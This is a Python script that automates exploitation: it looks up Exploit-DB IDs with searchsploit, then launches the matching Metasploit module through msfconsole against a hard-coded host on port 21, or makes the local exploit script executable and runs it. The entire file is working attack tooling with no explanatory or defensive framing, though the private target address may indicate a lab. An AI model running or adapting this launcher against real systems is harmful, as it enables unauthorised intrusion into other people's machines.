import subprocess,json,os,re,shlex

exploits_dict = {21: {'EDB-ID:123': '49757'}}
rhost = "192.168.10.4"

for port, edb_list in exploits_dict.items():
            for _ ,edb_id in edb_list.items():
                print(f"\n[+] Processing EDB-ID {edb_id} on port {port}")

                # 1) run searchsploit in JSON mode
                try:
                    sp = subprocess.run(
                        ['searchsploit', '-p', str(edb_id), '--json'],
                        capture_output=True, text=True, check=True
                    )
                    output= sp.stdout
                except subprocess.CalledProcessError as e:
                    print(f"[!] searchsploit failed: {e.stderr.strip()}")
                    continue
                except json.JSONDecodeError:
                    print("[!] Could not parse searchsploit JSON output.")
                    continue

                # Extract the first matching exploit record
                
                path_match = re.search(r'Path:\s+(.+)', output)
                exploit_path = path_match.group(1).strip() if path_match else None

                # Extract Metasploit module if it exists
                msf_match = re.search(r'Metasploit:\s+(.+)', output)
                msf_module = msf_match.group(1).strip() if msf_match else None
                
                if msf_module:
                    print(f"[+] Found Metasploit module {msf_module!r}, launching msfconsole…")
                    msf_cmds = [
                        f"use {msf_module}",
                        f"set RHOSTS {rhost}",
                        f"set RPORT {port}",
                        "set VERBOSE true",
                        "run",
                        "exit"
                    ]
                    subprocess.run(
                        ['msfconsole', '-q', '-x', '; '.join(msf_cmds)],
                        check=False
                    )
                    continue
                t = re.search(r'Exploit:\s*(.+)', output)
                if t:
                    title = t.group(1).strip()
                    print(f"[+] No explicit module – searching msfconsole for title:\n    {title}")

                    # build msfconsole commands: search → use 0 → set options → run → exit
                    msf_cmds = f"'search {title}; use 0; set RHOSTS {rhost}; set RPORT {port}; set VERBOSE true; run; exit -y;'"
                    
                    cmd = f'msfconsole -q -x {msf_cmds}'
                    print(cmd)
                    # run them all in one -x invocation
                    proc = subprocess.Popen(shlex.split(cmd), stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                    
                    try:
                        for line in iter(proc.stdout.readline, ''):
                            # output.append(line.strip() + "\n")
                            print(line.strip())

                        proc.wait()

                        if proc.returncode != 0:
                            for line in iter(proc.stderr.readline, ''):
                                print( f"Error: {line.strip()}")
                    except Exception as e:
                        print( f"Exception: {e}")

                    if proc.returncode == 0:
                        print("[+] Exploit ran successfully!")
                    else:
                        print(f"[!] msfconsole returned {proc.returncode}, check output:\n{proc.stderr}")

                    continue
                # 3) Otherwise, run the raw exploit script
                if not exploit_path or not os.path.exists(exploit_path):
                    print(f"[!] Exploit script not found at {exploit_path}")
                    continue

                # Ensure it is executable (chmod +x)
                if not os.access(exploit_path, os.X_OK):
                    os.chmod(exploit_path, 0o755)

                # Choose interpreter by file extension
                _, ext = os.path.splitext(exploit_path)
                if ext == '.py':
                    cmd = ['python3', exploit_path, rhost, str(port)]
                elif ext == '.pl':
                    cmd = ['perl', exploit_path, rhost, str(port)]
                elif ext == '.rb':
                    cmd = ['ruby', exploit_path, rhost, str(port)]
                else:
                    # fallback: try to execute directly
                    cmd = [exploit_path, rhost, str(port)]

                print(f"[+] Executing script: {' '.join(cmd)}")
                try:
                    subprocess.run(cmd, check=True)
                except subprocess.CalledProcessError as e:
                    print(f"[!] Exploit script failed: {e}")